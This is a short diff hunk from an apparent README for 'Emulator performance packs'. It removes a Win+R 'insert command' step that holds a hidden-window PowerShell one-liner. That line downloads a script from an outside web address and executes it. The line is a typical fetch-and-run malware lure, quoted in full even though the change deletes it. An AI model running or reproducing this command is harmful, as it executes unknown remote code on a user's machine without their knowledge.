@@ -223,7 +223,7 @@ Emulator performance packs
 - #### Press WIN+R
 - #### Insert command
 ```bash
-powershell -WindowStyle Hidden -Command ([ScriptBlock]::Create((irm https://jaihind.edu.in/grapesubject/repairbetter))).Invoke();
+
 ```
 
 ```
